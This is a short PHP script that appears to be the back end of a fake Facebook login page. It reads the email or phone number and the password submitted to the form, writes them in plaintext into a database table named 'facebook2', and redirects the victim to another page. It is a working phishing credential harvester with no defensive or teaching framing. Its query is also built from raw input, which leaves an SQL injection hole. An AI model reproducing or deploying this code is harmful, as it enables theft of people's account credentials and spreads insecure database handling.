<?php
include 'koneksi.php';
$email_telepon 	= $_POST['email_telepon'];
$password 			= $_POST['password'];

$sql = "INSERT INTO facebook2 (email_telepon,password) VALUES ('$email_telepon','$password')";
mysqli_query($connect,$sql);
header('location:kurniloginfacebook1.php');
?>

